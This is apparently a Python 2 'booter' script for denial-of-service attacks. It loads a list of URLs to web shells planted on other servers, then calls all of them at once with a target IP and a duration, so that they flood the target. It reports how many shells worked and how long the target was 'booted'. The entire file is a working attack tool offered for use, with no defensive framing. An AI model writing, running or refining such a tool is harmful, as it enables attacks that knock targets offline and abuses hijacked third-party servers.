#!/usr/bin/env python

from multiprocessing.pool import ThreadPool as Pool
import urllib2, sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''

if sys.platform == 'win32':
	bcolors.disable()

print(bcolors.HEADER + "  __     __ __   __   ______         ")       
print(bcolors.OKBLUE + " |  |--.|__|  |_|  |_|__    |.-----. ")
print(bcolors.OKGREEN + " |    < |  |   _|   _|__    ||     | ")
print(bcolors.FAIL + " |__|__||__|____|____|______||__|__| \n")

shellpath = raw_input(bcolors.FAIL + "[*]" + bcolors.ENDC + " FILE: ") 
target = raw_input(bcolors.FAIL + "[*]" + bcolors.ENDC + " IP: ")       
time = raw_input(bcolors.FAIL + "[*]" + bcolors.ENDC + " TIME: ") 

counter = 0 
c_executed = 0

def openShells(path):
	shells = []
	with open(path) as inputfile:
		for line in inputfile:
			shells.append(line.strip())

	print "[+] Loaded " + str(len(shells)) + " 'GET' Shells from " + path + "!"
	return shells

def bootIt(toexec, shell, target,time):
	global counter, c_executed
	print "[" + bcolors.OKBLUE + "+" + bcolors.ENDC + "] Executing: " + shell
	c_executed += 1
	if c_executed == toexec:
		print "\n\n"
	try:
		shellres = urllib2.urlopen(shell + "?host=" + target + "&time=" + str(time)).read()
		print "[" + bcolors.OKGREEN + "+" + bcolors.ENDC + "] " + shell + "?host=" + target +"&time=" + str(time)
		counter += 1
	except urllib2.HTTPError, e:
		print "[" + bcolors.FAIL + "!" + bcolors.ENDC + "] " + shell + " Failed. (" + bcolors.FAIL + "Error: " + bcolors.ENDC + str(e.code) + ")"
		pass
	except urllib2.URLError, e:
		print "[" + bcolors.FAIL + "!" + bcolors.ENDC + "] " + shell + " Failed. (" + bcolors.FAIL + "Error: " + bcolors.ENDC + str(e.args) + ")"
		pass
	except:
		e = sys.exc_info()[0]
		print "[" + bcolors.FAIL + "!" + bcolors.ENDC + "] " + shell + " Failed. (" + bcolors.FAIL + "Error: " + bcolors.ENDC + str(e).strip("<class ") + ")"
		pass

def main():
	print "\n Target: " + target
	print "   Time: " + str(time)
	print ""
	shells = openShells(shellpath)

	pool = Pool(len(shells))

	print ""
	rusure = raw_input(bcolors.WARNING + "Warning: " + bcolors.ENDC + "Are you sure you wish to continue? [Y/n] ")
	if rusure.lower() == 'y':

		for shell in shells:
			pool.apply_async(bootIt, (len(shells), shell,target,time,))

		pool.close()
		pool.join()
		print "\n Working shells: " + str(counter) + "/" + str(len(shells))
		print " Booted '" + bcolors.OKGREEN + target + bcolors.ENDC + "' for '" + bcolors.OKGREEN + str(time) + bcolors.ENDC + "' seconds with '" + bcolors.OKGREEN + str(counter) + bcolors.ENDC + "' shells."
	else:
		print "Exiting..."

if __name__ == "__main__":
	try:
		main()
	except(KeyboardInterrupt):
		print bcolors.FAIL + "\nKeyboardInterrupt" + bcolors.ENDC + " detected."
		print "Exiting..."
		sys.exit()
